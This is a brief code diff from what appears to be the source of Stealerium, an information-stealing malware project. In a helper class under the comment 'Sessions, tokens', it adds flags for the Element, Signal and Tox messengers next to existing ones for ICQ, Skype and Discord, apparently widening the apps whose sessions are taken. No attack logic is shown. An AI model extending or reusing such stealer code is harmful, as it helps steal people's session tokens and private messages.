@@ -21,6 +21,9 @@ namespace Stealerium.Helpers
         public static int FtpHosts = 0;
 
         // Sessions, tokens
+        public static bool Element = false;
+        public static bool Signal = false;
+        public static bool Tox = false;
         public static bool Icq = false;
         public static bool Skype = false;
         public static bool Discord = false;
